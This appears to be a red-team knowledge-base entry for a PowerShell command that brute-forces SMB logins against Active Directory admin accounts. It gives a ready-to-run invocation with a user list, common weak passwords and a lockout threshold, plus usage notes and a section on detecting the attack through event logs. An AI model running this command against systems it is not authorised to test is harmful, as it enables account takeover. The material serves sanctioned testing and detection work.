---
id: 370f7c04-05ff-4fe0-98df-e33b611782ae
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:04.297548+00:00'
updated_at: '2023-04-10T20:25:55.316905+00:00'
platforms:
  - Windows
tags:
  - smb
  - brute-force
validated: true
---

# invoke-smb-auto-brute-with-password-lists

## Code

```powershell
Invoke-SMBAutoBrute -UserList "C:\ProgramData\admins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
```

## Description

This PowerShell code invokes automated SMB brute forcing with user/password lists, including a lockout threshold and verbose output for monitoring progress.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| C:\ProgramData\admins.txt | Path to user list | C:\users.txt |
| Password1, Welcome1, 1qazXDR%+ | Comma-separated passwords | P@ssw0rd,123456 |
| 5 | Lockout attempts limit | 3 |

## Usage

Execute on a Windows host with SMB access; prepare lists beforehand. Suitable for targeted admin account testing in AD environments.

## Detection

- SMB auth failures (Event 4625) from scripted sources.
- PowerShell execution logs showing Invoke-SMBAutoBrute.
- High volume of NTLM auth attempts.

## Related

- [[procedures/Password-Spraying-with-Pre-Generated-Passwords]]
- [[Invoke-SMBAutoBrute]]
